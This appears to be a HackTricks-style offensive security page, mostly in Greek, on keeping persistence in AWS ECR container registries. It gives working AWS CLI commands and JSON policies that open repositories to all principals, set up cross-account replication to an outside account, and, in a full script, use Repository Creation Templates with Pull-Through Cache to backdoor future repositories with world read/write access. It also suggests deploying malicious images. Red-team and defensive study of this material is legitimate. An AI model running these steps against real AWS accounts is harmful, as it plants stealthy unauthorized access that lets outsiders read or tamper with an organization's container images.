# AWS - ECR Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## ECR

Για περισσότερες πληροφορίες δείτε:

{{#ref}}
../../aws-services/aws-ecr-enum.md
{{#endref}}

### Κρυμμένη Docker Image με Malicious Code

Ένας attacker θα μπορούσε να **upload a Docker image containing malicious code** σε ένα ECR repository και να το χρησιμοποιήσει για να διατηρήσει persistence στον στοχευμένο AWS account. Στη συνέχεια, ο attacker θα μπορούσε να αναπτύξει το malicious image σε διάφορες υπηρεσίες εντός του account, όπως Amazon ECS ή EKS, με stealthy τρόπο.

### Repository Policy

Προσθέστε μια πολιτική σε ένα μεμονωμένο repository που παραχωρεί σε εσάς (ή σε όλους) πρόσβαση στο repository:
```bash
aws ecr set-repository-policy \
--repository-name cluster-autoscaler \
--policy-text file:///tmp/my-policy.json

# With a .json such as

{
"Version" : "2008-10-17",
"Statement" : [
{
"Sid" : "allow public pull",
"Effect" : "Allow",
"Principal" : "*",
"Action" : [
"ecr:BatchCheckLayerAvailability",
"ecr:BatchGetImage",
"ecr:GetDownloadUrlForLayer"
]
}
]
}
```
> [!WARNING]
> Σημειώστε ότι το ECR απαιτεί οι χρήστες να έχουν **άδεια** να πραγματοποιούν κλήσεις στο API **`ecr:GetAuthorizationToken`** μέσω μιας IAM policy **προτού να μπορέσουν να πιστοποιηθούν** σε ένα registry και να κάνουν push ή pull οποιεσδήποτε εικόνες από οποιοδήποτε Amazon ECR repository.

### Πολιτική μητρώου & Cross-account Replication

Είναι δυνατόν να αναπαραγάγετε αυτόματα ένα registry σε έναν εξωτερικό λογαριασμό ρυθμίζοντας cross-account replication, όπου χρειάζεται να **δηλώσετε τον εξωτερικό λογαριασμό** στον οποίο θέλετε να αναπαραγάγετε το registry.

<figure><img src="../../../images/image (79).png" alt=""><figcaption></figcaption></figure>

Πρώτα, πρέπει να δώσετε στον εξωτερικό λογαριασμό πρόσβαση στο registry με μια **registry policy** όπως:
```bash
aws ecr put-registry-policy --policy-text file://my-policy.json

# With a .json like:

{
"Sid": "asdasd",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::947247140022:root"
},
"Action": [
"ecr:CreateRepository",
"ecr:ReplicateImage"
],
"Resource": "arn:aws:ecr:eu-central-1:947247140022:repository/*"
}
```
Στη συνέχεια, εφαρμόστε τη διαμόρφωση replication:
```bash
aws ecr put-replication-configuration \
--replication-configuration file://replication-settings.json \
--region us-west-2

# Having the .json a content such as:
{
"rules": [{
"destinations": [{
"region": "destination_region",
"registryId": "destination_accountId"
}],
"repositoryFilters": [{
"filter": "repository_prefix_name",
"filterType": "PREFIX_MATCH"
}]
}]
}
```
### Repository Creation Templates (prefix backdoor για μελλοντικά repos)

Καταχρησιμοποιήστε τα ECR Repository Creation Templates για να τοποθετήσετε αυτόματα backdoor σε οποιοδήποτε repository που το ECR δημιουργεί αυτόματα κάτω από ένα ελεγχόμενο prefix (για παράδειγμα μέσω Pull-Through Cache ή Create-on-Push). Αυτό παρέχει μόνιμη μη εξουσιοδοτημένη πρόσβαση σε μελλοντικά repos χωρίς να αγγίζονται τα υπάρχοντα.

- Απαιτούμενα perms: ecr:CreateRepositoryCreationTemplate, ecr:DescribeRepositoryCreationTemplates, ecr:UpdateRepositoryCreationTemplate, ecr:DeleteRepositoryCreationTemplate, ecr:SetRepositoryPolicy (used by the template), iam:PassRole (if a custom role is attached to the template).
- Επίπτωση: Οποιοδήποτε νέο repository δημιουργείται υπό το στοχευμένο prefix κληρονομεί αυτόματα μια attacker-controlled repository policy (π.χ. cross-account read/write), tag mutability, και scanning defaults.

<details>
<summary>Τοποθέτηση backdoor σε μελλοντικά PTC-created repos κάτω από επιλεγμένο prefix</summary>
```bash
# Region
REGION=us-east-1

# 1) Prepare permissive repository policy (example grants everyone RW)
cat > /tmp/repo_backdoor_policy.json <<'JSON'
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "BackdoorRW",
"Effect": "Allow",
"Principal": {"AWS": "*"},
"Action": [
"ecr:BatchCheckLayerAvailability",
"ecr:BatchGetImage",
"ecr:GetDownloadUrlForLayer",
"ecr:InitiateLayerUpload",
"ecr:UploadLayerPart",
"ecr:CompleteLayerUpload",
"ecr:PutImage"
]
}
]
}
JSON

# 2) Create a Repository Creation Template for prefix "ptc2" applied to PULL_THROUGH_CACHE
aws ecr create-repository-creation-template   --region $REGION   --prefix ptc2   --applied-for PULL_THROUGH_CACHE   --image-tag-mutability MUTABLE   --repository-policy file:///tmp/repo_backdoor_policy.json

# 3) Create a Pull-Through Cache rule that will auto-create repos under that prefix
#    This example caches from Amazon ECR Public namespace "nginx"
aws ecr create-pull-through-cache-rule   --region $REGION   --ecr-repository-prefix ptc2   --upstream-registry ecr-public   --upstream-registry-url public.ecr.aws   --upstream-repository-prefix nginx

# 4) Trigger auto-creation by pulling a new path once (creates repo ptc2/nginx)
acct=$(aws sts get-caller-identity --query Account --output text)
aws ecr get-login-password --region $REGION | docker login --username AWS --password-stdin ${acct}.dkr.ecr.${REGION}.amazonaws.com

docker pull ${acct}.dkr.ecr.${REGION}.amazonaws.com/ptc2/nginx:latest

# 5) Validate the backdoor policy was applied on the newly created repository
aws ecr get-repository-policy --region $REGION --repository-name ptc2/nginx --query policyText --output text | jq .
```
</details>

{{#include ../../../../banners/hacktricks-training.md}}
